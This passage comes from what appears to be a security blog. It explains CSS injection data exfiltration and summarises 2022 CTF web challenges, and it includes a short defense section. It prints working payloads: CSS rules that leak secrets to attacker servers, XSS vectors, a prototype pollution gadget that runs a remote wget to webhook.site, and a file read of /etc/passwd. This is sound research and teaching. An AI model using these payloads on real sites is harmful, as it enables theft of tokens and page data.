from a legitimate place. SummaryIn this article, we saw the principle of using CSS to steal data, which is to use the “attribute selector” plus the simple function of “loading images”, and demonstrated how to steal data from hidden inputs and meta tags, using HackMD as a practical example. However, there are still some questions that we have not answered, such as: HackMD can load new styles without refreshing the page because it can synchronize content in real-time. What about other websites? How do you steal the second character and beyond? If you can only steal one character at a time, do you have to steal for a long time? Is this feasible in practice? Is there a way to steal things other than attributes? For example, the text content on the page, or even JavaScript code? What are the defense methods against this attack method? We will answer these questions one by one in the next article. Link to the next article: https://blog.huli.tw/2022/09/29/css-injection-2","link":"/2022/09/29/en/css-injection-1/"},{"title":"Stealing Data with CSS - CSS Injection (Part 2)","text":"In Part 1, we learned the basic principle of stealing data with CSS and successfully stole the CSRF token as a practical example using HackMD. This article will delve into some details of CSS injection and address the following issues: Since HackMD can load new styles without refreshing the page, how can we steal the second character and beyond on other websites? If we can only steal one character at a time, will it take a long time? Is this feasible in practice? Is it possible to steal things other than attributes? For example, text content on a page or even JavaScript code? What are the defense mechanisms against this attack? Stealing All CharactersAs we mentioned in Part 1, the data we want to steal may change after refreshing the page (such as the CSRF token), so we must load new styles without refreshing the page. The answer to this problem is given in CSS Injection Attacks: @import. In CSS, you can use @import to import other styles from external sources, just like import in JavaScript. We can use this feature to create a loop that imports styles, as shown in the following code: @import url(https://myserver.com/start?len=8) Then, the server returns the following style: @import url(https://myserver.com/payload?len=1) @import url(https://myserver.com/payload?len=2) @import url(https://myserver.com/payload?len=3) @import url(https://myserver.com/payload?len=4) @import url(https://myserver.com/payload?len=5) @import url(https://myserver.com/payload?len=6) @import url(https://myserver.com/payload?len=7) @import url(https://myserver.com/payload?len=8) The key point is that although 8 are imported at once, “the server will hang for the next 7 requests and not respond”, and only the first URL https://myserver.com/payload?len=1 will return a response, which is the payload for stealing data mentioned earlier: input[name=\"secret\"][value^=\"a\"] &#123; background: url(https://b.myserver.com/leak?q=a) &#125; input[name=\"secret\"][value^=\"b\"] &#123; background: url(https://b.myserver.com/leak?q=b) &#125; input[name=\"secret\"][value^=\"c\"] &#123; background: url(https://b.myserver.com/leak?q=c) &#125; //.... input[name=\"secret\"][value^=\"z\"] &#123; background: url(https://b.myserver.com/leak?q=z) &#125; When the browser receives the response, it will first load the CSS above, and after loading, elements that meet the conditions will send requests to the backend. Assuming the first character is d, the server will then return the response of https://myserver.com/payload?len=2, which is: input[name=\"secret\"][value^=\"da\"] &#123; background: url(https://b.myserver.com/leak?q=da) &#125; input[name=\"secret\"][value^=\"db\"] &#123; background: url(https://b.myserver.com/leak?q=db) &#125; input[name=\"secret\"][value^=\"dc\"] &#123; background: url(https://b.myserver.com/leak?q=dc) &#125; //.... input[name=\"secret\"][value^=\"dz\"] &#123; background: url(https://b.myserver.com/leak?q=dz) &#125; This process can be repeated to send all characters to the server, relying on the feature that import will load resources that have already been downloaded and then wait for those that have not yet been downloaded. One thing to note here is that you will notice that the domain we load the style from is myserver.com, while the domain of the background image is b.myserver.com. This is because browsers usually have a limit on the number of requests that can be loaded from a single domain at the same time. Therefore, if you use only myserver.com, you will find that the request for the background image cannot be sent out and is blocked by CSS import. Therefore, two domains need to be set to avoid this situation. In addition, this method is not feasible in Firefox because even if the response of the first request comes back, Firefox will not update the style immediately. It will wait for all requests to return before updating. The solution can be found in CSS data exfiltration in Firefox via a single injection point. Remove the first import step and wrap each character’s import in an additional style, like this: &lt;style>@import url(https://myserver.com/payload?len=1)&lt;/style> &lt;style>@import url(https://myserver.com/payload?len=2)&lt;/style> &lt;style>@import url(https://myserver.com/payload?len=3)&lt;/style> &lt;style>@import url(https://myserver.com/payload?len=4)&lt;/style> &lt;style>@import url(https://myserver.com/payload?len=5)&lt;/style> &lt;style>@import url(https://myserver.com/payload?len=6)&lt;/style> &lt;style>@import url(https://myserver.com/payload?len=7)&lt;/style> &lt;style>@import url(https://myserver.com/payload?len=8)&lt;/style> The above code works fine in Chrome, so we can change it to the above code to support both browsers. To summarize, using the @import CSS feature allows us to “dynamically load new styles without reloading the page” and thus steal every character from behind. Stealing one character at a time is too slow, isn’t it?If we want to execute this type of attack in the real world, we may need to improve efficiency. For example, in HackMD, the CSRF token has a total of 36 characters, so we need to send 36 requests, which is too many. In fact, we can steal two characters at a time because, as mentioned in the previous section, there are suffix selectors in addition to prefix selectors. Therefore, we can do this: input[name=\"secret\"][value^=\"a\"] &#123; background: url(https://b.myserver.com/leak?q=a) &#125; input[name=\"secret\"][value^=\"b\"] &#123; background: url(https://b.myserver.com/leak?q=b) &#125; // ... input[name=\"secret\"][value$=\"a\"] &#123; border-background: url(https://b.myserver2.com/suffix?q=a) &#125; input[name=\"secret\"][value$=\"b\"] &#123; border-background: url(https://b.myserver2.com/suffix?q=b) &#125; In addition to stealing the beginning, we also steal the end, which immediately doubles the efficiency. It is important to note that the CSS for the beginning and end uses different properties, background and border-background, respectively. If we use the same property, the content will be overwritten by others, and only one request will be sent in the end. If there are not many characters that may appear in the content, such as 16, we can directly steal two beginnings and two ends at a time, and the total number of CSS rules is 16*16*2 &#x3D; 512, which should still be within an acceptable range and can speed up the process by another two times. In addition, we can also improve towards the server side, such as using HTTP&#x2F;2 or even HTTP&#x2F;3, which have the opportunity to speed up the loading speed of requests and improve efficiency. Stealing other thingsBesides stealing attributes, is there any way to steal other things? For example, other text on the page? Or even the code in the script? According to the principle we mentioned in the previous section, it is impossible to do so. The reason we can steal attributes is that the “attribute selector” allows us to select specific elements, and in CSS, there is no selector that can select “text content”. Therefore, we need to have a deeper understanding of CSS and styles on the webpage to achieve this seemingly impossible task. unicode-rangeIn CSS, there is a property called “unicode-range”, which can load different fonts for different characters. For example, the following example is taken from MDN: &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;style> @font-face &#123; font-family: \"Ampersand\"; src: local(\"Times New Roman\"); unicode-range: U+26; &#125; div &#123; font-size: 4em; font-family: Ampersand, Helvetica, sans-serif; &#125; &lt;/style> &lt;div>Me &amp; You = Us&lt;/div> &lt;/body> &lt;/html> The unicode of &amp; is U+0026, so only the character &amp; will be displayed in a different font, and the others will use the same font. Front-end engineers may have used this trick, for example, to use different fonts to display English and Chinese. This trick can also be used to steal text on the page, like this: &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;style> @font-face &#123; font-family: \"f1\"; src: url(https://myserver.com?q=1); unicode-range: U+31; &#125; @font-face &#123; font-family: \"f2\"; src: url(https://myserver.com?q=2); unicode-range: U+32; &#125; @font-face &#123; font-family: \"f3\"; src: url(https://myserver.com?q=3); unicode-range: U+33; &#125; @font-face &#123; font-family: \"fa\"; src: url(https://myserver.com?q=a); unicode-range: U+61; &#125; @font-face &#123; font-family: \"fb\"; src: url(https://myserver.com?q=b); unicode-range: U+62; &#125; @font-face &#123; font-family: \"fc\"; src: url(https://myserver.com?q=c); unicode-range: U+63; &#125; div &#123; font-size: 4em; font-family: f1, f2, f3, fa, fb, fc; &#125; &lt;/style> Secret: &lt;div>ca31a&lt;/div> &lt;/body> &lt;/html> If you check the network tab, you will see a total of 4 requests sent: With this trick, we can know that there are 13ac four characters on the page. The limitation of this trick is obvious: We don’t know the order of the characters. We don’t know the repeated characters. However, thinking about how to steal characters from the perspective of “loading fonts” has really brought a new way of thinking to many people and has developed various other methods. Font height difference + first-line + scrollbarThis trick mainly solves the problem encountered in the previous trick: “cannot know the order of the characters”. This trick combines many details, and there are many steps, so you need to listen carefully. First, we can actually not load external fonts and leak out characters using built-in fonts. How can we do this? We need to find two sets of built-in fonts with different heights. For example, there is a font called “Comic Sans MS”, which is higher than another font called “Courier New”. For example, assuming that the default font height is 30px and Comic Sans MS is 45px. Now we set the height of the text block to 40px and load the font, like this: &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;style> @font-face &#123; font-family: \"fa\"; src:local('Comic Sans MS'); font-style:monospace; unicode-range: U+41; &#125; div &#123; font-size: 30px; height: 40px; width: 100px; font-family: fa, \"Courier New\"; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; &#125; &lt;/style> Secret: &lt;div>DBC&lt;/div> &lt;div>ABC&lt;/div> &lt;/body> &lt;/html> We will see the difference on the screen: It is obvious that A is higher than the height of other characters, and according to our CSS settings, if the content height exceeds the container height, a scrollbar will appear. Although it is not visible in the screenshot above, the ABC below has a scrollbar, while the DBC above does not. Moreover, we can actually set an external background for the scrollbar: div::-webkit-scrollbar &#123; background: blue; &#125; div::-webkit-scrollbar:vertical &#123; background: url(https://myserver.com?q=a); &#125; In other words, if the scrollbar appears, our server will receive a request. If the scrollbar does not appear, no request will be received. Furthermore, when I apply the “fa” font to the div, if there is an “A” on the screen, the scrollbar will appear, and the server will receive a request. If there is no “A” on the screen, nothing will happen. Therefore, if I keep loading different fonts repeatedly, I can know what characters are on the screen on the server, which is the same as what we can do with unicode-range we learned earlier. So how do we solve the order problem? We can first reduce the width of the div to only display one character, so that other characters will be placed on the second line. Then, with the help of the ::first-line selector, we can adjust the style specifically for the first line, like this: &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;style> @font-face &#123; font-family: \"fa\"; src:local('Comic Sans MS'); font-style:monospace; unicode-range: U+41; &#125; div &#123; font-size: 0px; height: 40px; width: 20px; font-family: fa, \"Courier New\"; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; &#125; div::first-line&#123; font-size: 30px; &#125; &lt;/style> Secret: &lt;div>CBAD&lt;/div> &lt;/body> &lt;/html> You will only see the character “C” on the screen because we first set the size of all characters to 0 using font-size: 0px, and then use div::first-line to adjust the font-size of the first line to 30px. In other words, only the characters on the first line can be seen, and the current div width is only 20px, so only the first character will appear. Next, we can use the trick we just learned to load different fonts and see what happens. When I load the “fa” font, because there is no “A” on the screen, nothing will change. But when I load the “fc” font, “C” appears on the screen, so it will be displayed using Comic Sans MS, the height will increase, the scrollbar will appear, and we can use it to send a request, like this: div &#123; font-size: 0px; height: 40px; width: 20px; font-family: fc, \"Courier New\"; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; --leak: url(http://myserver.com?C); &#125; div::first-line&#123; font-size: 30px; &#125; div::-webkit-scrollbar &#123; background: blue; &#125; div::-webkit-scrollbar:vertical &#123; background: var(--leak); &#125; So how do we keep using new font-families? We can use CSS animation to continuously load different font-families and specify different --leak variables. In this way, we can know what the first character on the screen is. After knowing the first character, we can make the width of the div longer, for example, to 40px, which can accommodate two characters. Therefore, the first line will be the first two characters, and then we can use the same method to load different font-families to leak out the second character, as follows: Assuming that the screen displays ACB Adjust the width to 20px, and only the first character A appears on the first line Load the font “fa”, so A is displayed in a larger font, the scrollbar appears, load the scrollbar background, and send a request to the server Load the font “fb”, but since B does not appear on the screen, nothing will change. Load the font “fc”, but since C does not appear on the screen, nothing will change. Adjust the width to 40px, and the first line displays the first two characters AC Load the font “fa”, same as step 3 Load the font “fb”, B is displayed in a larger font, the scrollbar appears, and the background is loaded Load the font “fc”, C is displayed in a larger font, but because the same background has been loaded, no request will be sent End From the above process, it can be seen that the server will receive three requests in sequence, A, C, B, representing the order of the characters on the screen. Changing the width and font-family continuously can be achieved using CSS animation. If you want to see the complete demo, you can check out this webpage (source: What can we do with single CSS injection?): https://demo.vwzq.net/css2.html Although this solution solves the problem of “not knowing the order of characters”, it still cannot solve the problem of duplicate characters, because no request will be sent for duplicate characters. Ultimate move: ligature + scrollbarIn short, this trick can solve all the above problems, achieve the goal of “knowing the order of characters and knowing duplicate characters”, and steal the complete text. Before understanding how to steal, we need to know a proprietary term called ligature. In some fonts, some specific combinations will be rendered as a connected shape, as shown in the figure below (source: wikipedia): So what’s the benefit of this to us? We can create a unique font ourselves, set ab as a ligature, and render an ultra-wide element. Then, we set the width of a certain div to a fixed value, and combine the scrollbar trick we just learned, which is: “If ab appears, it will become very wide, the scrollbar will appear, and we can load the request to tell the server; if it doesn’t appear, the scrollbar won’t appear, and nothing will happen.” The process is as follows, assuming there are the three characters acc on the screen: Load the font with the ligature aa, nothing happens. Load the font with the ligature ab, nothing happens. Load the font with the ligature ac, successfully render the ultra-wide screen, the scrollbar appears, and load the server image. The server knows that ac appears on the screen. Load the font with the ligature aca, nothing happens. Load the font with the ligature acb, nothing happens. Load the font with the ligature acc, successfully render, the scrollbar appears, and send the result to the server. The server knows that acc appears on the screen. Through ligatures combined with the scrollbar, we can leak out all the characters on the screen, even JavaScript code! Did you know that the contents of a script can be displayed on the screen? head, script &#123; display: block; &#125; Just add this CSS, and the contents of the script will be displayed on the screen. Therefore, we can also use the same technique to steal the contents of the script! In practice, you can use SVG with other tools to quickly generate fonts on the server side. If you want to see the details and related code, you can refer to this article: Stealing Data in Great style – How to Use CSS to Attack Web Application. Here, I will simply make a demo that is simplified to the extreme to prove that this is feasible. To simplify, someone has made a Safari version of the demo, because Safari supports SVG fonts, so there is no need to generate fonts from the server. The original article is here: Data Exfiltration via CSS + SVG Font - PoC (Safari only) Simple demo: &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;body> &lt;script> var secret = \"abc123\" &lt;/script> &lt;hr> &lt;script> var secret2 = \"cba321\" &lt;/script> &lt;svg> &lt;defs> &lt;font horiz-adv-x=\"0\"> &lt;font-face font-family=\"hack\" units-per-em=\"1000\" /> &lt;glyph unicode='\"a' horiz-adv-x=\"99999\" d=\"M1 0z\"/> &lt;/font> &lt;/defs> &lt;/svg> &lt;style> script &#123; display: block; font-family:\"hack\"; white-space:n owrap; overflow-x: auto; width: 500px; background:lightblue; &#125; script::-webkit-scrollbar &#123; background: blue; &#125; &lt;/style> &lt;/body> &lt;/html> I put two pieces of JS in the script, the contents of which are var secret = &quot;abc123&quot; and var secret2 = &quot;cba321&quot;, and then use CSS to load the font I prepared. As long as there is a ligature of &quot;a, the width will become ultra-wide. Next, if the scrollbar appears, I set the background to blue, which is more conspicuous. The final result is as follows: Above, because the content is var secret = &quot;abc123&quot;, it meets the ligature of &quot;a, so the width becomes wide and the scrollbar appears. Below, because there is no &quot;a, the scrollbar does not appear (where there is an a will be missing, which should be related to me not defining other glyphs, but it does not affect the result). Just change the background of the scrollbar to a URL, and you can know the leaked result from the server side. If you want to see the actual demo and server-side code, you can refer to the two articles attached above. DefenseFinally, let’s talk about defense. The simplest and most straightforward way is to simply seal up the style and not allow its use. Basically, there will be no CSS injection problems (unless there are vulnerabilities in the implementation). If you really want to open up the style, you can also use CSP to block the loading of some resources, such as not needing to fully open font-src, and style-src can also set an allow list to block the @import syntax. Next, you can also consider “what will happen if things on the page are taken away”, such as if the CSRF token is taken away, the worst case is CSRF, so you can implement more protection to block CSRF, even if the attacker obtains the CSRF token, they cannot CSRF (such as checking the origin header more). SummaryCSS is really vast and profound. I really admire these predecessors who can play with CSS in so many ways and develop so many eye-opening attack techniques. When I was studying it, I could understand using attribute selectors to leak, and I could understand using unicode-range, but the one that uses text height plus CSS animation to change, I spent a lot of time to figure out what it was doing. Although the concept of ligatures is easy to understand, there are still many problems when it comes to implementation. Finally, these two articles mainly introduce the CSS injection attack method. Therefore, there is not much actual code, and these attack methods are all referenced from previous articles. The list will be attached below. If you are interested, you can read the original text, which will be more detailed. If you want to delve into any attack, you can also leave a message to communicate with me. References: CSS Injection Attacks CSS Injection Primitives HackTricks - CSS Injection Stealing Data in Great style – How to Use CSS to Attack Web Application. Data Exfiltration via CSS + SVG Font Data Exfiltration via CSS + SVG Font - PoC (Safari only) CSS data exfiltration in Firefox via a single injection point","link":"/2022/09/29/en/css-injection-2/"},{"title":"Summary of CTF Web Frontend and JS Challenges in 2022","text":"This year, I seriously followed Water Paddler to play CTF for a whole year. I saw someone wrote a CTF: Best Web Challenges 2022 and found that I had played most of the challenges inside. So I thought it would be better for me to write a summary, documenting the challenges that I personally felt I had learned something new from. Because of my personal interest, the challenges that I played were related to frontend and JS. Challenges related to backend (PHP, Java, etc.) are not included. Also, the techniques or solutions recorded in this article do not represent the first appearance in CTF. They are just the first time I saw them or thought they were worth recording, so I wrote them down. I divided the challenges into several categories: JS-related knowledge Node.js related XSLeaks Frontend DOM&#x2F;BOM related knowledge Browser internal operation related JS-related knowledgeDiceCTF 2022 - no-cookiesThe key point of this challenge is a piece of code that looks like this: &#123; const pwd = prompt('input password') if (!/^[^$']+$/.test(pwd)) return document.querySelector('.note').innerHTML = xssPayload &#125; The last line has a DOM-based XSS, but the pwd you want to steal is inside the block, and it seems impossible to access this part. The key is the seemingly inconspicuous RegExp, which has a magical property called RegExp.input, which will remember the last thing tested. Therefore, you can use this to get the pwd. Detailed writeup: https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#webx2fno-cookies5-solves PlaidCTF 2022 - YACAThe core concept of the challenge is similar to this (but I remember it was an unintended solution): var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = prompt('your payload') value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) document.body.innerHTML = tmpl &gt;&quot; is all replaced, and it seems impossible to escape the attribute. But the key is that the parameter of tmpl replace can be controlled. At this time, you can use special replacement pattern to get the tag: var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = \"$'&lt;style onload=alert(1) \" value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) console.log(tmpl) // &lt;input type=\"submit\" value=\"\">&lt;style onload=alert(1) \"> Full writeup: https://blog.huli.tw/2022/04/14/en/javascript-string-regexp-magic/ ångstromCTF 2022 - CaaSio PSEIn short, use with() to bypass the restriction that . cannot be used. Complete writeup: https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup/#miscx2fcaasio-pse GoogleCTF 2022 - HORKOSI call this challenge “JS deserialization”. In short, there are also some magic methods in JS that will be executed automatically. For example, when you return something in an async function, if this thing is a Promise, it will be resolved before returning, so then will be called automatically. Similarly, some implicit type conversions will also call toString or valueOf, and toJSON will be called when converted to JSON. Complete writeup: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/ corCTF 2022 - sbxcalcvar p = new Proxy(&#123;flag: window.flag || 'flag'&#125;, &#123; get: () => 'nope' &#125;) How to get the original object protected by Proxy? The answer is Object.getOwnPropertyDescriptor(p, &#39;flag&#39;) Writeup: https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#corctf-2022-sbxcalc Node.js relatedDiceCTF 2022 - undefinedThe core of this problem is as follows: Function.prototype.constructor = undefined; delete global.global; process = undefined; &#123; let Array=undefined;let __dirname=undefined;let Int8Array=undefined; // ... a lot of similar statements to make things undefined console.log(eval(input)); &#125; Basically, everything is turned into undefined first, and then the code you pass in will be executed using eval. Although you can run anything, because everything has become undefined, there is not much you can do. There are three solutions: import(), which has not been deleted. Using arguments.callee.caller.arguments can get the overwritten arguments of the upper layer (a layer automatically wrapped by Node.js). Using try-catch can get the instance of Error. Detailed writeup: https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#miscx2fundefined55-solves corCTF 2022 - simplewafThe core of this problem is as follows: if([req.body, req.headers, req.query].some( (item) => item &amp;&amp; JSON.stringify(item).includes(\"flag\") )) &#123; return res.send(\"bad hacker!\"); &#125; res.send(fs.readFileSync(req.query.file || \"index.html\").toString()); You can control req.query.file, but it cannot contain the word flag. The goal is to read the file /app/flag.txt. You need to look at the internal implementation of fs.readFileSync and find that you can pass an object that looks like a URL instance, and it will use new URL() to read it, so you can bypass it with URL encoding: const fs = require('fs') console.log(fs.readFileSync(&#123; href: 1, origin: 1, protocol: 'file:', hostname: '', pathname: '/etc/passw%64' &#125;).toString()) // equals to readFileSync(new URL(\"file:///etc/passw%64\")) Author’s writeup: https://brycec.me/posts/corctf_2022_challenges#simplewaf Balsn CTF 2022 - 2linenodejsThe core of the code looks like this: #!/usr/local/bin/node process.stdin.setEncoding('utf-8'); process.stdin.on('readable', () => &#123; try&#123; console.log('HTTP/1.1 200 OK\\nContent-Type: text/html\\nConnection: Close\\n'); const json = process.stdin.read().match(/\\?(.*?)\\ /)?.[1], obj = JSON.parse(json); console.log(`JSON: $&#123;json&#125;, Object:`, require('./index')(obj, &#123;&#125;)); &#125;catch (e) &#123; require('./usage') &#125;finally&#123; process.exit(); &#125; &#125;); // index module.exports=(O,o) => ( Object.entries(O).forEach( ([K,V])=>Object.entries(V).forEach( ([k,v])=>(o[K]=o[K]||&#123;&#125;,o[K][k]=v) ) ), o ); There is an obvious prototype pollution, and RCE needs to be achieved. Here is a great paper for reference: Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js But the gadget mentioned in the paper has been fixed, so you need to find another one yourself, and the result is as follows: Object.prototype[\"data\"] = &#123; exports: &#123; \".\": \"./preinstall.js\" &#125;, name: './usage' &#125; Object.prototype[\"path\"] = '/opt/yarn-v1.22.19' Object.prototype.shell = \"node\" Object.prototype[\"npm_config_global\"] = 1 Object.prototype.env = &#123; \"NODE_DEBUG\": \"console.log(require('child_process').execSync('wget$&#123;IFS&#125;https://webhook.site?q=2').toString());process.exit()//\", \"NODE_OPTIONS\": \"--require=/proc/self/environ\" &#125; require('./usage.js') Details can be found in the complete writeup: https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#balsn-ctf-2022-2linenodejs XSleaksDiceCTF 2022 - carrotIn short, this problem uses connection pool to measure response time. You may think that measuring response time is not difficult. Just use fetch and calculate it yourself, right? But if there is a SameSite cookie, fetch cannot be used, and some XSleaks tricks are needed to measure time. In Chrome, the number of sockets is limited, generally 255, and headless is 99. Assuming we first consume the socket to only one left, at this time, we visit the URL we want to measure the time (called reqSearch), and at the same time, send another request to our own server (called reqMeasure). Since there is only one socket left, the time from reqMeasure sending the request to receiving the response is the time reqSearch takes + the time reqMeasure takes. If the time reqMeasure takes is about the same, then we can easily measure the time reqSearch takes. Detailed writeup: https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#webx2fcarrot1-solves TSJ CTF 2022 - Nim NotesIn this problem, you can achieve CRLF injection, but the position is at the bottom, so you cannot override CSP and XSS. How to steal the content of the page? Assuming that the content to be stolen is in &lt;script&gt;, you can use the header Content-Security-Policy-Report-Only, because when it violates the rules, it will send a JSON to the specified location, which will include the first 40 characters of the script. Complete writeup: https://blog.huli.tw/2022/03/02/en/tsj-ctf-2022-nim-notes/ ångstromCTF 2022 - SustenanceThere is a search function, and the difference between success and failure lies in the URL. For example, success is: /?m=your search...at 1651732982748 has success...., and failure is: /?m=your search...at 1651732982748 has failed There are two solutions. One is to use fetch to measure whether it is in the cache, as the response will be cached. Although Chrome has implemented Cache partition, headless has not yet. The second is to use cookie tossing with other same site domains to construct a cookie bomb. When the search is successful, the payload will be too large (because there are a few more characters in the URL), and there will be no problem when it fails, thus measuring the difference. Complete writeup: https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup/#webx2fsustenance justCTF 2022 - NinjaA new xsleak that uses :target with :before to load images. For details, please refer to: New technique of stealing data using CSS and Scroll-to-Text Fragment feature. Complete writeup: https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves SekaiCTF 2022 - safelistUse lazy-loading images to send requests to the server to slow down the server speed, and use timing attacks to determine whether the image is loaded. You can also use the connection pool or other elements mentioned earlier to solve it. Writeup: https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/ Front-end DOM&#x2F;BOM related knowledgeDiceCTF 2022 - shadowThe core of this problem is how to get things in the shadowDOM. For a more complete study, see: The Closed Shadow DOM But the final solution is: Set the CSS -webkit-user-modify property, which is similar to contenteditable Use window.find to find the content Use document.execCommand to insert HTML and use svg to get the node Detailed writeup: https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/#webx2fshadow0-solves LINE CTF 2022 - Haribote Secure NoteThere are two injection points in this problem. The first is in the script, which can control 16 characters, and the second is HTML injection. The biggest problem is that the CSP is very strict: &lt;meta content=\"default-src 'self'; style-src 'unsafe-inline'; object-src 'none'; base-uri 'none'; script-src 'nonce-&#123;&#123; csp_nonce &#125;&#125;' 'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default\" http-equiv=\"Content-Security-Policy\"> There are three solutions: The magical script data double escaped state import() will not be blocked by Trusted Types Use &lt;iframe src=&#39;/p&#39;&gt; to execute code on other pages to bypass CSP Here is a great article: Eliminating XSS from WebUI with Trusted Types Complete writeup: https://blog.huli.tw/2022/03/27/en/linectf-2022-writeup/#haribote-secure-note7-solves m0leCon CTF 2022 - ptMDLeak URL using meta combination: &lt;meta name=\"referrer\" content=\"unsafe-url\" /> &lt;meta http-equiv=\"refresh\" content=\"3;url=https://webhook.site/d485f13a-fd8b-4cfd-ad13-63d9b0f1f5ef\" /> In a strict CSP state, meta can be used as a breakthrough technique. These meta tags, like the ones above, work even if they are not placed inside the head tag, and even after they are removed. Full writeup: https://blog.huli.tw/2022/05/21/en/m0lecon-ctf-2022-writeup/ corCTF 2022 - modernblogThis is a React app that uses dangerouslySetInnerHTML to render your content, which means you get an HTML injection. But CSP doesn’t allow you to execute scripts: script-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;; What you need to steal is the URL with the flag ID, which appears on the /home page. If we can do CSS injection on that page, we can steal it like this: a[href^=\"/post/0\"] &#123; background: url(//myserver?c=0); &#125; a[href^=\"/post/1\"] &#123; background: url(//myserver?c=1); &#125; // ... And since we are currently on the /posts/:id page, we cannot get the content of the /home page, so we cannot do this. The key point of this question is a very interesting usage of DOM clobbering. Nowadays, React apps basically use react-router to do routing. This lib will use document.defaultView.history to see what the URL is and decide which page to render. And document.defaultView can be affected by DOM clobbering, like this: &lt;iframe name=defaultView src=/home>&lt;/iframe> In this way, document.defaultView.history becomes /home, so we can render another React app inside the React app using iframe srcdoc, and use the CSS injection mentioned earlier to get the flag ID: &lt;iframe srcdoc=\" &lt;iframe name=defaultView src=/home>&lt;/iframe>&lt;br> &lt;style> a[href^=\"/post/0\"] &#123; background: url(//myserver?c=0); &#125; a[href^=\"/post/1\"] &#123; background: url(//myserver?c=1); &#125; &lt;/style> react app below&lt;br> &lt;div id=root>&lt;/div> &lt;script type=module crossorigin src=/assets/index.7352e15a.js>&lt;/script> \" height=\"1000px\" width=\"500px\">&lt;/iframe> My previous English writeup: https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/ HITCON CTF 2022 - Self Destruct MessageOriginally, when using element.innerHTML = str, it was asynchronous, but using the magical &lt;svg&gt;&lt;svg&gt; can make it synchronous: const div = document.createElement('div') div.innerHTML = '&lt;svg>&lt;svg onload=console.log(1)>' console.log(2) It will output 1 first and then 2, and it will take effect without inserting it into the DOM. Related discussion: https://twitter.com/terjanq/status/1421093136022048775 Writeup: https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#hitcon-ctf-2022 SekaiCTF 2022 - Obligatory CalcTwo key points: e.source in onmessage is the source window that sends the message. Although it looks like an object at first glance, if it is closed immediately after postMessage, it will become null. Accessing document.cookie under a sandbox iframe will result in an error. Browser internals relatedGoogleCTF 2022 - POSTVIEWERThis question is related to the order in which the browser executes things, as well as site isolation and other things. Through these things, you can construct an iframe-related race condition. Full writeup: https://blog.huli.tw/2022/07/09/en/google-ctf-2022-writeup/#postviewer-10-solves UIUCTF 2022 - modernismThe code is very simple: from flask import Flask, Response, request app = Flask(__name__) @app.route('/') def index(): prefix = bytes.fromhex(request.args.get(\"p\", default=\"\", type=str)) flag = request.cookies.get(\"FLAG\", default=\"uiuctf&#123;FAKEFLAG&#125;\").encode() #^uiuctf&#123;[A-Za-z]+&#125;$ return Response(prefix+flag, mimetype=\"text/plain\") After adding the flag you provided and outputting it, although the MIME type is text/plain, because X-Content-Type-Options: nosniff is not added, &lt;script&gt; can still be used to load this part. However, because the flag contains &#123;&#125;, it cannot be easily made into an executable script (syntax error will keep appearing). The solution is to add a BOM at the beginning, and the browser will read the entire script in UTF-16, and the flag will become strange Chinese characters and will not be broken. The content to be placed is ++window., and then you can see which property of the window has been changed. The solution to this problem basically requires knowledge of how the browser reads. Full writeup: https://blog.huli.tw/2022/08/01/en/uiuctf-2022-writeup/ UIUCTF 2022 - precisionismAn extension of the previous challenge, only adding Enjoy your flag! at the end, so the trick mentioned above cannot be used. The expected solution is to make the response into ICO format, put the part to be leaked into the width, and it is possible to get the width of the image cross-originally, so you can leak the data byte by byte. Full writeup: https://blog.huli.tw/2022/08/01/en/uiuctf-2022-writeup/#precisionism3-solves SECCON CTF 2022 Quals - spanoteThis question uses bfcache: https://web.dev/i18n/en/bfcache/ Suppose there is an API that looks like this: fastify.get(\"/api/notes/:noteId\", async (request, reply) => &#123; const user = new User(request.session.userId); if (request.headers[\"x-token\"] !== hash(user.id)) &#123; throw new Error(\"Invalid token\"); &#125; const noteId = validate(request.params.noteId); return user.sendNote(reply, noteId); &#125;); Although it is a GET, it will check the custom header, so theoretically it cannot be viewed by accessing it directly with a browser. But using bfcache, it can be solved like this: Open /api/notes/id in a new window, and an error screen will appear Go to the homepage with the same tab. At this time, the homepage will use fetch to fetch /api/notes/id with a custom header, and the browser will store the result in the disk cache Go back one page, and the screen will display the cached result You can directly browse the cached response in the browser, bypassing the custom header restriction. Full writeup: https://blog.huli.tw/2022/12/08/en/ctf-js-notes/#seccon-ctf-2022-quals-spanote Bonus: Authors of Great Web ChallengesIt takes a lot of time and effort to make a good CTF challenge, so I thought I would wrote a bit about these authors since I have already wrote about the challenges. The first is Ankur Sundara, a member of the dicegang team. He created the UIUCTF questions mentioned above, and he also created a question related to content type before. I feel that he must have read the Chromium source code related parts before producing those questions. In addition, he also wrote this research on Shadow DOM: The Closed Shadow DOM The second is terjanq, who works at Google. He created the GoogleCTF race condition question mentioned above, and he has also created a lot of classic questions before. He maintains the XSleak wiki, and I always feel that there is nothing he doesn’t know about behavior related to browsers… He occasionally plays 